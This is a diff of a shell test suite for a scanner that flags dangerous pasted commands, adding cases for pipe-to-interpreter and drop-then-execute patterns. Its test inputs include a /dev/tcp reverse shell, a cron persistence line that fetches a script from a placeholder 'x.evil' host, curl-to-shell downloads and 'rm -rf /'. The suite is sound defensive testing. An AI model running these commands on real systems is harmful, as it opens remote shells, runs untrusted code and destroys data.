@@ -421,7 +421,7 @@ jcheck "P8: benign pkg-mgr install stays ALERT band" 'd["score"] == 45' paste 'b
 # to P16/P17 so no code carries two detection meanings.
 jcheck "reason_ids: multi-block emits all block ids" 'd.get("reason_ids") == ["HLSE-PASTE-P2","HLSE-PASTE-P8","HLSE-PASTE-P16"]' paste 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 && powershell -enc http://x.evil/a.ps1 && curl http://x | sh'
 jcheck "reason_ids: destructive payload keeps P9" 'd.get("reason_ids") == ["HLSE-PASTE-P9"]' paste 'rm -rf /'
-jcheck "reason_ids: persistence injection is P17" 'd.get("reason_ids") == ["HLSE-PASTE-P2","HLSE-PASTE-P11","HLSE-PASTE-P17"]' paste 'echo "* * * * * curl http://x.evil/a.sh | sh" | crontab -'
+jcheck "reason_ids: persistence injection is P17" 'd.get("reason_ids") == ["HLSE-PASTE-P2","HLSE-PASTE-P11","HLSE-PASTE-OTHER","HLSE-PASTE-P17"]' paste 'echo "* * * * * curl http://x.evil/a.sh | sh" | crontab -'
 jcheck "reason_ids: uncoded compound falls back to OTHER" 'd.get("reason_ids") == ["HLSE-PASTE-P2","HLSE-PASTE-P4","HLSE-PASTE-OTHER"]' paste 'sudo curl http://x.evil/a.sh | sudo sh'
 jcheck "reason_ids: clean paste emits empty array" 'd.get("reason_ids") == []' paste 'echo hello'
 
@@ -612,6 +612,44 @@ jcheck "crossfix: znc -e conf P8 only" 'd["score"] == 45 and "P16" not in str(d[
 jcheck "crossfix: vnc -l P8 only" 'd["score"] == 45 and "P13" not in str(d["reasons"])' paste 'vnc -l'
 # dot-source of a local path stays clean (P12 is fetch-gated)
 jcheck "crossfix: . /tmp/x.sh stays clean" 'd["score"] == 0' paste '. /tmp/x.sh'
+
+# cycle-488 P12d: source/drop-then-execute — the payload source is
+# inline or a file read instead of a download.  (a) source piped to an
+# interpreter at +45; (b) drop verb + &&/; exec chain at +45.
+
+# (a) source | interpreter — the simplest injection cradle
+for c in "echo 'x' | sh" "echo x | bash" "printf x | sh" "printf 'x' | bash" \
+    "cat s | sh" "cat s | bash" "cat <<EOF | sh" "cat < f | sh" \
+    "tail -1 f | sh" "head -1 f | sh" "sed -n 2p f | sh" "awk 'NR==2' f | sh" \
+    "grep x f | sh" "sort f | sh" "cut -d: -f1 f | sh" "uniq f | sh" \
+    "dd if=f | sh" "tr a b < f | sh" "cat f | zsh" "cat f | /bin/sh" \
+    "echo x | sudo sh"; do
+    jcheck "srcpipe: $c" 'd["score"] >= 45 and "P12d" in str(d["reasons"])' paste "$c"
+done
+
+# (b) drop verb + exec chain
+for c in "cat > s && sh s" "cat>s && sh s" "cat >> s && sh s" \
+    "cat <<EOF > s && sh s" "cat > s << EOF && sh s" \
+    "echo x > s && sh s" "echo x >s && sh s" "echo -e x > s && sh s" \
+    "printf 'x' > s && sh s" "tee s && sh s" "echo x | tee s && sh s" \
+    "dd if=f of=s && sh s" "install -m 755 s /t/s && /t/s"; do
+    jcheck "dropexec: $c" 'd["score"] >= 45 and "P12d" in str(d["reasons"])' paste "$c"
+done
+
+# FP guards: container words cannot fire the tok-matched verbs
+for c in "concat > s && sh x" "bobcat x | sh" "ahead of x | sh" \
+    "detail x | sh" "used s | sh" "shortcut x | sh" \
+    "guarantee s && sh x" "odds s && sh x"; do
+    jcheck "srcpipe FP: $c clean" 'd["score"] == 0 and d["reasons"] == []' paste "$c"
+done
+# `| sudo` alone is not an interpreter — answer-piping stays clean
+jcheck "srcpipe: echo|sudo apt P4 only" 'd["score"] == 15 and "P12d" not in str(d["reasons"])' paste "echo y | sudo apt install x"
+# no interpreter on the pipe end → clean
+jcheck "srcpipe: cat|grep stays clean" 'd["score"] == 0' paste "cat f | grep x"
+# write without exec chain → clean (P11 persist pins handle those paths)
+for c in "cat > s && cd s" "cat > s && make" "echo x > f.txt" "cat /etc/hostname"; do
+    jcheck "dropexec FP: $c clean" 'd["score"] == 0 and d["reasons"] == []' paste "$c"
+done
 
 # P8 (also:) overflow guard: 5 hits with 105-141-char labels must not
 # smash extra[192] — cycle-439 fixed a would-be-length advance that
